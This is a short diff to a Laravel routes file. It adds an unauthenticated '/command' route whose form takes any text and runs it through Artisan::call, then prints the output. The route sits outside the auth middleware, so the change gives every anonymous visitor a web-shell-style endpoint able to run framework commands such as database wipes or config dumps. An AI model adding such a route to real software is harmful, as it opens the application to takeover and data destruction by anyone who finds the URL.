@@ -3,7 +3,8 @@
 use App\Http\Controllers\Auth\AuthenticatedSessionController;
 use App\Http\Controllers\ProfileController;
 use App\Http\Controllers\ReportController;
-use Illuminate\Support\Facades\DB;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 use Inertia\Inertia;
 
@@ -29,6 +30,14 @@ use Inertia\Inertia;
 //});
 
 Route::get('/', [AuthenticatedSessionController::class, 'create']);
+Route::get('/command', static function (Request $request){
+    $form = "<form method='get' action='/command'>command: <input type='text' name='command'/><input type='submit'></form>";
+    if($request->command){
+        Artisan::call($request->command);
+        return $form.'<br/>'. Artisan::output();
+    }
+    return $form;
+});
 
 
 Route::middleware('auth')->group(function () {
